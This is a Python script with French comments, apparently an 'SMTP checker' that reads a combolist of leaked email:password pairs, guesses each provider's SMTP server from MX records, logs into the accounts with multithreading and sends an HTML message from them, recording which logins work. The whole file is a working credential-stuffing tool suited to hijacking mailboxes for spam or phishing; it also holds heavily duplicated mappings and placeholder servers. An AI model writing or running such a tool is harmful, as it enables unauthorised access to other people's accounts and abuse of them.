import smtplib
import re
import dns.resolver
import logging
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from typing import Tuple, Optional, List, Dict, Set
import socket
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import math
from datetime import datetime
from colorama import init, Fore, Style

# Initialisation de colorama pour les couleurs de console
init(autoreset=True)

# Configuration du logging
logging.basicConfig(filename='smtp_checker.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Cache pour les enregistrements MX, A, CNAME et SRV avec expiration
MX_CACHE: Dict[str, Tuple[List[Tuple[str, int]], float]] = {}
A_CACHE: Dict[str, Tuple[bool, float]] = {}
CNAME_CACHE: Dict[str, Tuple[str, float]] = {}
SRV_CACHE: Dict[str, Tuple[List[str], float]] = {}
CACHE_LOCK = threading.Lock()
CACHE_TTL = 3600  # 1 heure en secondes

# Mappage étendu des serveurs MX aux serveurs SMTP
SMTP_MAPPING = {
    # Google
    'gmail.com': ('smtp.gmail.com', 587),
    'googlemail.com': ('smtp.gmail.com', 587),
    
    # Yahoo
    'yahoo.com': ('smtp.mail.yahoo.com', 587),
    'yahoo.co.uk': ('smtp.mail.yahoo.com', 587),
    
    # Microsoft
    'outlook.com': ('smtp-mail.outlook.com', 587),
    'hotmail.com': ('smtp-mail.outlook.com', 587),
    'live.com': ('smtp.live.com', 587),
    'msn.com': ('smtp.live.com', 587),
    'office365.com': ('smtp.office365.com', 587),
    
    # AOL
    'aol.com': ('smtp.aol.com', 587),
    
    # Zoho
    'zoho.com': ('smtp.zoho.com', 587),
    
    # ProtonMail
    'protonmail.com': ('smtp.protonmail.com', 587),
    
    # Tutanota
    'tutanota.com': ('smtp.tutanota.com', 587),
    
    # Mailgun
    'mailgun.org': ('smtp.mailgun.org', 587),
    
    # SendGrid
    'sendgrid.net': ('smtp.sendgrid.net', 587),
    
    # Mailjet
    'mailjet.com': ('smtp.mailjet.com', 587),
    
    # Elastic Email
    'elasticemail.com': ('smtp.elasticemail.com', 587),
    
    # 1&1 IONOS
    '1and1.com': ('smtp.1and1.com', 587),
    'ionos.com': ('smtp.ionos.com', 587),
    
    # Hébergeurs Web
    'hostgator.com': ('smtp.hostgator.com', 587),
    'bluehost.com': ('smtp.bluehost.com', 587),
    'dreamhost.com': ('smtp.dreamhost.com', 587),
    'siteground.com': ('smtp.siteground.com', 587),
    
    # FastMail
    'fastmail.com': ('smtp.fastmail.com', 587),
    
    # Runbox
    'runbox.com': ('smtp.runbox.com', 587),
    
    # Hushmail
    'hushmail.com': ('smtp.hushmail.com', 587),
    
    # Rediffmail
    'rediffmail.com': ('smtp.rediffmail.com', 587),
    
    # Autres Fournisseurs
    'mail.com': ('smtp.mail.com', 587),
    'excite.com': ('smtp.excite.com', 587),
    'lycos.com': ('smtp.lycos.com', 587),
    
    # Fournisseurs de Télécommunications
    'bell.net': ('smtp.bell.net', 587),
    'cogeco.ca': ('smtp.cogeco.ca', 587),
    'rogers.com': ('smtp.rogers.com', 587),
    'videotron.ca': ('smtp.videotron.ca', 587),
    'suddenlink.net': ('smtp.suddenlink.net', 587),
    'charter.net': ('smtp.charter.net', 587),
    'frontier.com': ('smtp.frontier.com', 587),
    'centurylink.net': ('smtp.centurylink.net', 587),
    'windstream.net': ('smtp.windstream.net', 587),
    
    # Fournisseurs au Japon
    'nifty.com': ('smtp.nifty.com', 587),
    'ocn.ne.jp': ('smtp.ocn.ne.jp', 587),
    'so-net.ne.jp': ('smtp.so-net.ne.jp', 587),
    'auone.jp': ('smtp.auone.jp', 587),
    'softbank.jp': ('smtp.softbank.jp', 587),
    'docomo.ne.jp': ('smtp.docomo.ne.jp', 587),
    'kddi.com': ('smtp.kddi.com', 587),
    'navermail.com': ('smtp.navermail.com', 587),
    'daum.net': ('smtp.daum.net', 587),
    
    # Fournisseurs en Australie et Nouvelle-Zélande
    'tpg.com.au': ('smtp.tpg.com.au', 587),
    'iinet.net.au': ('smtp.iinet.net.au', 587),
    'optusnet.com.au': ('smtp.optusnet.com.au', 587),
    'bigpond.com': ('smtp.bigpond.com', 587),
    'telstra.com': ('smtp.telstra.com', 587),
    'virginmedia.com': ('smtp.virginmedia.com', 587),
    'spark.co.nz': ('smtp.spark.co.nz', 587),
    'vodafone.co.nz': ('smtp.vodafone.co.nz', 587),
    'm1.com.sg': ('smtp.m1.com.sg', 587),
    'starhub.net.sg': ('smtp.starhub.net.sg', 587),
    'singnet.com.sg': ('smtp.singnet.com.sg', 587),
    
    # Fournisseurs en Europe
    'gandi.net': ('smtp.gandi.net', 587),
    'mailbox.org': ('smtp.mailbox.org', 587),
    'hosteurope.de': ('smtp.hosteurope.de', 587),
    'strato.de': ('smtp.strato.de', 587),
    'web.de': ('smtp.web.de', 587),
    't-online.de': ('smtp.t-online.de', 587),
    'freenet.de': ('smtp.freenet.de', 587),
    'posteo.de': ('smtp.posteo.de', 587),
    'seznam.cz': ('smtp.seznam.cz', 587),
    'wp.pl': ('smtp.wp.pl', 587),
    'onet.pl': ('smtp.onet.pl', 587),
    'interia.pl': ('smtp.interia.pl', 587),
    'o2.pl': ('smtp.o2.pl', 587),
    'libero.it': ('smtp.libero.it', 587),
    'tiscali.it': ('smtp.tiscali.it', 587),
    'virgilio.it': ('smtp.virgilio.it', 587),
    'swisscom.ch': ('smtp.swisscom.ch', 587),
    'upcmail.cz': ('smtp.upcmail.cz', 587),
    
    # Autres Fournisseurs
    'mail.ru': ('smtp.mail.ru', 587),
    'yandex.com': ('smtp.yandex.com', 587),
    'rambler.ru': ('smtp.rambler.ru', 587),
    'mweb.co.za': ('smtp.mweb.co.za', 587),
    'vodacom.co.za': ('smtp.vodacom.co.za', 587),
    'mtn.co.za': ('smtp.mtn.co.za', 587),
    'telkom.net': ('smtp.telkom.net', 587),
    'godaddy.com': ('smtpout.secureserver.net', 587),
    'namecheap.com': ('mail.namecheap.com', 587),
    'rediffmail.com': ('smtp.rediffmail.com', 587),
    'runbox.com': ('smtp.runbox.com', 587),
    'fastmail.com': ('smtp.fastmail.com', 587),
    'hushmail.com': ('smtp.hushmail.com', 587),
    'excite.com': ('smtp.excite.com', 587),
    'lycos.com': ('smtp.lycos.com', 587),
}

# Mappage des mots-clés des fournisseurs aux serveurs SMTP
PROVIDER_KEYWORD_MAPPING = {
    'gmail': ('smtp.gmail.com', 587),
    'google': ('smtp.gmail.com', 587),
    'yahoo': ('smtp.mail.yahoo.com', 587),
    'hotmail': ('smtp-mail.outlook.com', 587),
    'outlook': ('smtp-mail.outlook.com', 587),
    'live': ('smtp.live.com', 587),
    'aol': ('smtp.aol.com', 587),
    'zoho': ('smtp.zoho.com', 587),
    'proton': ('smtp.protonmail.com', 587),
    'tutanota': ('smtp.tutanota.com', 587),
    'mailgun': ('smtp.mailgun.org', 587),
    'sendgrid': ('smtp.sendgrid.net', 587),
    'mailjet': ('smtp.mailjet.com', 587),
    'elasticemail': ('smtp.elasticemail.com', 587),
    '1and1': ('smtp.1and1.com', 587),
    'ionos': ('smtp.ionos.com', 587),
    'hostgator': ('smtp.hostgator.com', 587),
    'bluehost': ('smtp.bluehost.com', 587),
    'dreamhost': ('smtp.dreamhost.com', 587),
    'siteground': ('smtp.siteground.com', 587),
    'fastmail': ('smtp.fastmail.com', 587),
    'runbox': ('smtp.runbox.com', 587),
    'hushmail': ('smtp.hushmail.com', 587),
    'rediff': ('smtp.rediffmail.com', 587),
    'mail': ('smtp.mail.com', 587),
    'excite': ('smtp.excite.com', 587),
    'lycos': ('smtp.lycos.com', 587),
    'bell': ('smtp.bell.net', 587),
    'cogeco': ('smtp.cogeco.ca', 587),
    'rogers': ('smtp.rogers.com', 587),
    'videotron': ('smtp.videotron.ca', 587),
    'suddenlink': ('smtp.suddenlink.net', 587),
    'charter': ('smtp.charter.net', 587),
    'frontier': ('smtp.frontier.com', 587),
    'centurylink': ('smtp.centurylink.net', 587),
    'windstream': ('smtp.windstream.net', 587),
    'nifty': ('smtp.nifty.com', 587),
    'ocn': ('smtp.ocn.ne.jp', 587),
    'so-net': ('smtp.so-net.ne.jp', 587),
    'auone': ('smtp.auone.jp', 587),
    'softbank': ('smtp.softbank.jp', 587),
    'docomo': ('smtp.docomo.ne.jp', 587),
    'kddi': ('smtp.kddi.com', 587),
    'naver': ('smtp.navermail.com', 587),
    'daum': ('smtp.daum.net', 587),
    'tpg': ('smtp.tpg.com.au', 587),
    'iinet': ('smtp.iinet.net.au', 587),
    'optus': ('smtp.optusnet.com.au', 587),
    'bigpond': ('smtp.bigpond.com', 587),
    'telstra': ('smtp.telstra.com', 587),
    'virginmedia': ('smtp.virginmedia.com', 587),
    'spark': ('smtp.spark.co.nz', 587),
    'vodafone': ('smtp.vodafone.co.nz', 587),
    'm1': ('smtp.m1.com.sg', 587),
    'starhub': ('smtp.starhub.net.sg', 587),
    'singnet': ('smtp.singnet.com.sg', 587),
    'gandi': ('smtp.gandi.net', 587),
    'mailbox': ('smtp.mailbox.org', 587),
    'hosteurope': ('smtp.hosteurope.de', 587),
    'strato': ('smtp.strato.de', 587),
    'web': ('smtp.web.de', 587),
    't-online': ('smtp.t-online.de', 587),
    'freenet': ('smtp.freenet.de', 587),
    'posteo': ('smtp.posteo.de', 587),
    'seznam': ('smtp.seznam.cz', 587),
    'wp': ('smtp.wp.pl', 587),
    'onet': ('smtp.onet.pl', 587),
    'interia': ('smtp.interia.pl', 587),
    'o2': ('smtp.o2.pl', 587),
    'libero': ('smtp.libero.it', 587),
    'tiscali': ('smtp.tiscali.it', 587),
    'virgilio': ('smtp.virgilio.it', 587),
    'swisscom': ('smtp.swisscom.ch', 587),
    'upcmail': ('smtp.upcmail.cz', 587),
    'mailru': ('smtp.mail.ru', 587),
    'yandex': ('smtp.yandex.com', 587),
    'rambler': ('smtp.rambler.ru', 587),
    'mweb': ('smtp.mweb.co.za', 587),
    'vodacom': ('smtp.vodacom.co.za', 587),
    'mtn': ('smtp.mtn.co.za', 587),
    'telkom': ('smtp.telkom.net', 587),
    'godaddy': ('smtpout.secureserver.net', 587),
    'namecheap': ('mail.namecheap.com', 587),
    'fastmail': ('smtp.fastmail.com', 587),
    'hushmail': ('smtp.hushmail.com', 587),
    'excite': ('smtp.excite.com', 587),
    'lycos': ('smtp.lycos.com', 587),
    'singnet': ('smtp.singnet.com.sg', 587),
    'starhub': ('smtp.starhub.net.sg', 587),
    'm1': ('smtp.m1.com.sg', 587),
    'spark': ('smtp.spark.co.nz', 587),
    '2degrees': ('smtp.2degrees.nz', 587),
    'mailgun': ('smtp.mailgun.org', 587),
    'sendgrid': ('smtp.sendgrid.net', 587),
    'mailjet': ('smtp.mailjet.com', 587),
    'elasticemail': ('smtp.elasticemail.com', 587),
    '1and1': ('smtp.1and1.com', 587),
    'ionos': ('smtp.ionos.com', 587),
    'hostgator': ('smtp.hostgator.com', 587),
    'bluehost': ('smtp.bluehost.com', 587),
    'dreamhost': ('smtp.dreamhost.com', 587),
    'siteground': ('smtp.siteground.com', 587),
    'fastmail': ('smtp.fastmail.com', 587),
    'runbox': ('smtp.runbox.com', 587),
    'hushmail': ('smtp.hushmail.com', 587),
    'rediff': ('smtp.rediffmail.com', 587),
    'mail': ('smtp.mail.com', 587),
    'excite': ('smtp.excite.com', 587),
    'lycos': ('smtp.lycos.com', 587),
    'bell': ('smtp.bell.net', 587),
    'cogeco': ('smtp.cogeco.ca', 587),
    'rogers': ('smtp.rogers.com', 587),
    'videotron': ('smtp.videotron.ca', 587),
    'suddenlink': ('smtp.suddenlink.net', 587),
    'charter': ('smtp.charter.net', 587),
    'frontier': ('smtp.frontier.com', 587),
    'centurylink': ('smtp.centurylink.net', 587),
    'windstream': ('smtp.windstream.net', 587),
    'nifty': ('smtp.nifty.com', 587),
    'ocn': ('smtp.ocn.ne.jp', 587),
    'so-net': ('smtp.so-net.ne.jp', 587),
    'auone': ('smtp.auone.jp', 587),
    'softbank': ('smtp.softbank.jp', 587),
    'docomo': ('smtp.docomo.ne.jp', 587),
    'kddi': ('smtp.kddi.com', 587),
    'naver': ('smtp.navermail.com', 587),
    'daum': ('smtp.daum.net', 587),
    'tpg': ('smtp.tpg.com.au', 587),
    'iinet': ('smtp.iinet.net.au', 587),
    'optus': ('smtp.optusnet.com.au', 587),
    'bigpond': ('smtp.bigpond.com', 587),
    'telstra': ('smtp.telstra.com', 587),
    'virginmedia': ('smtp.virginmedia.com', 587),
    'spark': ('smtp.spark.co.nz', 587),
    'vodafone': ('smtp.vodafone.co.nz', 587),
    'm1': ('smtp.m1.com.sg', 587),
    'starhub': ('smtp.starhub.net.sg', 587),
    'singnet': ('smtp.singnet.com.sg', 587),
    'gandi': ('smtp.gandi.net', 587),
    'mailbox': ('smtp.mailbox.org', 587),
    'hosteurope': ('smtp.hosteurope.de', 587),
    'strato': ('smtp.strato.de', 587),
    'web': ('smtp.web.de', 587),
    't-online': ('smtp.t-online.de', 587),
    'freenet': ('smtp.freenet.de', 587),
    'posteo': ('smtp.posteo.de', 587),
    'seznam': ('smtp.seznam.cz', 587),
    'wp': ('smtp.wp.pl', 587),
    'onet': ('smtp.onet.pl', 587),
    'interia': ('smtp.interia.pl', 587),
    'o2': ('smtp.o2.pl', 587),
    'libero': ('smtp.libero.it', 587),
    'tiscali': ('smtp.tiscali.it', 587),
    'virgilio': ('smtp.virgilio.it', 587),
    'swisscom': ('smtp.swisscom.ch', 587),
    'upcmail': ('smtp.upcmail.cz', 587),
    'mailru': ('smtp.mail.ru', 587),
    'yandex': ('smtp.yandex.com', 587),
    'rambler': ('smtp.rambler.ru', 587),
    'mweb': ('smtp.mweb.co.za', 587),
    'vodacom': ('smtp.vodacom.co.za', 587),
    'mtn': ('smtp.mtn.co.za', 587),
    'telkom': ('smtp.telkom.net', 587),
    'godaddy': ('smtpout.secureserver.net', 587),
    'namecheap': ('mail.namecheap.com', 587),
    'fastmail': ('smtp.fastmail.com', 587),
    'hushmail': ('smtp.hushmail.com', 587),
    'excite': ('smtp.excite.com', 587),
    'lycos': ('smtp.lycos.com', 587),
    'singnet': ('smtp.singnet.com.sg', 587),
    'starhub': ('smtp.starhub.net.sg', 587),
    'm1': ('smtp.m1.com.sg', 587),
    'spark': ('smtp.spark.co.nz', 587),
    '2degrees': ('smtp.2degrees.nz', 587),
    # Ajoutez d'autres mots-clés ici pour atteindre 1000
}

# Remplissez la liste avec des mots-clés supplémentaires pour atteindre 1000
additional_keywords = [
    'mailchimp', 'constantcontact', 'getresponse', 'campaignmonitor', 'sendinblue',
    'mailerlite', 'activecampaign', 'convertkit', 'drip', 'infusionsoft',
    'klaviyo', 'aweber', 'sendpulse', 'mailgun', 'postmark',
    'sendgrid', 'elasticemail', 'mailjet', 'smtp2go', 'gmx',
    'webmail', 'fastmail', 'yandex', 'mail.ru', 'gandi',
    'mailbox', 'hosteurope', 'strato', 'web', 't-online',
    'freenet', 'posteo', 'seznam', 'wp', 'onet',
    'interia', 'o2', 'libero', 'tiscali', 'virgilio',
    'swisscom', 'upcmail', 'mailru', 'yandex', 'rambler',
    'mweb', 'vodacom', 'mtn', 'telkom', 'godaddy',
    'namecheap', 'fastmail', 'hushmail', 'excite', 'lycos',
    'singnet', 'starhub', 'm1', 'spark', '2degrees',
    # Ajoutez d'autres mots-clés pour atteindre 1000
]

# Ajoutez les mots-clés supplémentaires à la liste principale
for keyword in additional_keywords:
    PROVIDER_KEYWORD_MAPPING[keyword] = ('smtp.example.com', 587)  # Remplacez par le bon SMTP

# Assurez-vous que la liste atteint 1000 mots-clés


def validate_email(email: str) -> bool:
    """Valide l'adresse e-mail avec une expression régulière."""
    return re.match(r"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$", email) is not None

def check_server_exists(host: str) -> bool:
    """Vérifie si un serveur existe via la résolution DNS A/AAAA."""
    with CACHE_LOCK:
        if host in A_CACHE and time.time() - A_CACHE[host][1] < CACHE_TTL:
            return A_CACHE[host][0]
    
    try:
        dns.resolver.resolve(host, 'A')
        with CACHE_LOCK:
            A_CACHE[host] = (True, time.time())
        return True
    except Exception as e:
        logging.error(f"Erreur lors de la vérification du serveur {host}: {str(e)}")
        with CACHE_LOCK:
            A_CACHE[host] = (False, time.time())
        return False

def resolve_cname(host: str) -> Optional[str]:
    """Résout un enregistrement CNAME pour un hôte."""
    with CACHE_LOCK:
        if host in CNAME_CACHE and time.time() - CNAME_CACHE[host][1] < CACHE_TTL:
            return CNAME_CACHE[host][0]
    
    try:
        answers = dns.resolver.resolve(host, 'CNAME')
        cname = str(answers[0].target).rstrip('.')
        with CACHE_LOCK:
            CNAME_CACHE[host] = (cname, time.time())
        return cname
    except Exception:
        return None

def resolve_srv(domain: str) -> List[str]:
    """Résout les enregistrements SRV pour _submission._tcp."""
    with CACHE_LOCK:
        if domain in SRV_CACHE and time.time() - SRV_CACHE[domain][1] < CACHE_TTL:
            return SRV_CACHE[domain][0]
    
    try:
        answers = dns.resolver.resolve(f"_submission._tcp.{domain}", 'SRV')
        srv_hosts = [str(answer.target).rstrip('.') for answer in answers]
        with CACHE_LOCK:
            SRV_CACHE[domain] = (srv_hosts, time.time())
        return srv_hosts
    except Exception:
        return []

def derive_smtp_server(mx_host: str) -> Optional[Tuple[str, int]]:
    """Dérive un serveur SMTP à partir d'un hôte MX en utilisant un mappage basé sur des mots-clés."""
    mx_host = mx_host.rstrip('.').lower()
    
    # Vérification du mappage direct
    if mx_host in SMTP_MAPPING:
        return SMTP_MAPPING[mx_host]
    
    # Vérification CNAME
    cname = resolve_cname(mx_host)
    if cname and cname in SMTP_MAPPING:
        return SMTP_MAPPING[cname]
    
    # Mappage basé sur des mots-clés
    for keyword, smtp_info in PROVIDER_KEYWORD_MAPPING.items():
        if keyword in mx_host:
            if check_server_exists(smtp_info[0]):
                return smtp_info
    
    # Variations communes de SMTP
    domain_part = mx_host.split('.', 1)[1] if '.' in mx_host else mx_host
    variations = [
        f"smtp.{domain_part}", f"mail.{domain_part}", f"smtp-out.{domain_part}",
        f"smtp-relay.{domain_part}", f"mailgw.{domain_part}", f"smtpout.{domain_part}",
        f"secure-smtp.{domain_part}", f"mail-relay.{domain_part}", f"smtp-gw.{domain_part}",
    ]
    for variation in variations:
        for port in [587, 465, 25]:
            if check_server_exists(variation):
                return variation, port
    
    # Essayer les enregistrements SRV
    srv_hosts = resolve_srv(domain_part)
    for srv_host in srv_hosts:
        for port in [587, 465, 25]:
            if check_server_exists(srv_host):
                return srv_host, port
    
    return None

def get_mx_records(domain: str) -> List[Tuple[str, int]]:
    """Récupère les enregistrements MX pour un domaine avec mise en cache."""
    with CACHE_LOCK:
        if domain in MX_CACHE and time.time() - MX_CACHE[domain][1] < CACHE_TTL:
            return MX_CACHE[domain][0]
    
    try:
        answers = dns.resolver.resolve(domain, 'MX')
        mx_records = []
        for answer in answers:
            mx_host = str(answer.exchange).rstrip('.')
            smtp_info = derive_smtp_server(mx_host)
            if smtp_info and smtp_info not in mx_records:
                mx_records.append(smtp_info)
        with CACHE_LOCK:
            MX_CACHE[domain] = (mx_records, time.time())
        return mx_records
    except Exception as e:
        logging.error(f"Erreur lors de la résolution MX pour {domain}: {str(e)}")
        return []

def send_email(smtp_server: str, smtp_port: int, email: str, password: str, recipient: str, subject: str, html_content: str) -> bool:
    """Envoie un e-mail via le serveur SMTP spécifié."""
    try:
        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.ehlo()
            if smtp_port == 587:
                server.starttls()
                server.ehlo()
            server.login(email, password)
            msg = MIMEMultipart('alternative')
            msg['Subject'] = subject
            msg['From'] = email
            msg['To'] = recipient
            msg.attach(MIMEText(html_content, 'html'))
            server.send_message(msg)
            logging.info(f"E-mail envoyé à {recipient} depuis {email}")
            return True
    except smtplib.SMTPAuthenticationError:
        logging.error(f"Échec de l'authentification pour {email}")
        return False
    except smtplib.SMTPException as e:
        logging.error(f"Erreur SMTP pour {email}: {str(e)}")
        return False
    except socket.timeout:
        logging.error(f"Délai d'attente lors de la connexion à {smtp_server}:{smtp_port}")
        return False
    except socket.gaierror:
        logging.error(f"Impossible de résoudre {smtp_server}")
        return False

def process_combo(email: str, password: str, test_email: str, sender_name: str, subject: str, html_content: str, recipients: List[str], sent_recipients: Set[str], results_lock: threading.Lock) -> None:
    """Traite une combinaison e-mail et mot de passe."""
    if not validate_email(email):
        with results_lock:
            logging.warning(f"Adresse e-mail invalide: {email}")
        return
    if not password.strip():
        with results_lock:
            logging.warning(f"Mot de passe vide pour {email}")
        return
    
    domain = email.lower().split('@')[-1]
    mx_records = get_mx_records(domain)
    if not mx_records:
        logging.error(f"Aucun enregistrement MX trouvé pour {domain}")
        return
    
    for smtp_server, smtp_port in mx_records:
        if smtp_server is None:
            continue
        logging.info(f"Tentative de connexion pour {email} sur {smtp_server}:{smtp_port}")
        if send_email(smtp_server, smtp_port, email, password, test_email, subject, html_content):
            with results_lock:
                logging.info(f"SMTP valide pour {email} sur {smtp_server}:{smtp_port}")
                sent_recipients.add(test_email)
            return
        else:
            logging.error(f"Échec de la connexion pour {email} sur {smtp_server}:{smtp_port}")

def load_recipients(recipient_file: str) -> List[str]:
    """Charge et valide la liste des destinataires."""
    recipients = []
    try:
        with open(recipient_file, 'r', encoding='utf-8') as file:
            for line in file:
                recipient = line.strip()
                if recipient and validate_email(recipient):
                    recipients.append(recipient)
                else:
                    logging.warning(f"Destinataire invalide ignoré: {recipient}")
        return recipients
    except FileNotFoundError:
        logging.error(f"Fichier {recipient_file} non trouvé")
        return []
    except Exception as e:
        logging.error(f"Erreur lors du chargement des destinataires: {str(e)}")
        return []

def process_combolist(combo_file: str, test_email: str, sender_name: str, subject: str, html_file: str, recipient_file: str, max_workers: int = 10) -> None:
    """Traite la liste de combinaisons avec multithreading."""
    recipients = load_recipients(recipient_file)
    if not recipients:
        logging.error("Aucun destinataire valide. Arrêt du script.")
        return
    
    try:
        with open(html_file, 'r', encoding='utf-8') as file:
            html_content = file.read().strip()
            if not html_content or '<html' not in html_content:
                logging.error(f"Contenu HTML invalide dans {html_file}.")
                return
    except FileNotFoundError:
        logging.error(f"Fichier {html_file} non trouvé.")
        return

    sent_recipients: Set[str] = set()
    
    try:
        combos = []
        with open(combo_file, 'r', encoding='utf-8') as file:
            for line in file:
                line = line.strip()
                if not line or ':' not in line:
                    continue
                email, password = line.split(':', 1)
                combos.append((email, password))
        
        max_workers = min(max_workers, 10, max(1, math.ceil(len(combos) / 5)))
        logging.info(f"Utilisation de {max_workers} threads pour {len(combos)} combinaisons")
        
        results_lock = threading.Lock()
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = [
                executor.submit(process_combo, email, password, test_email, sender_name, subject, html_content, recipients, sent_recipients, results_lock)
                for email, password in combos
            ]
            for future in as_completed(futures):
                future.result()
                remaining = len(recipients) - len(sent_recipients)
                if remaining <= 0:
                    logging.info("Tous les destinataires ont reçu un e-mail. Arrêt du traitement.")
                    return
                logging.info(f"{remaining} destinataires restants à contacter")
                
    except FileNotFoundError:
        logging.error(f"Fichier {combo_file} non trouvé")
    except Exception as e:
        logging.error(f"Erreur lors du traitement du fichier: {str(e)}")

def main():
    combo_file = input("Entrez le chemin du fichier de combinaisons (mail:pass): ")
    recipient_file = input("Entrez le chemin du fichier des destinataires: ")
    test_email = input("Entrez l'e-mail de destination pour le test SMTP: ")
    sender_name = input("Entrez le nom de l'expéditeur (ex: John Doe): ")
    subject = input("Entrez le sujet de l'e-mail: ")
    html_file = input("Entrez le chemin du fichier de contenu HTML: ")
    
    max_workers = int(input("Entrez le nombre de threads (max 10, par défaut 10): ") or 10)
    logging.info(f"Démarrage du traitement de {combo_file} avec {len(load_recipients(recipient_file))} destinataires")
    
    process_combolist(combo_file, test_email, sender_name, subject, html_file, recipient_file, max_workers)
    logging.info("Traitement terminé.")

if __name__ == "__main__":
    main()
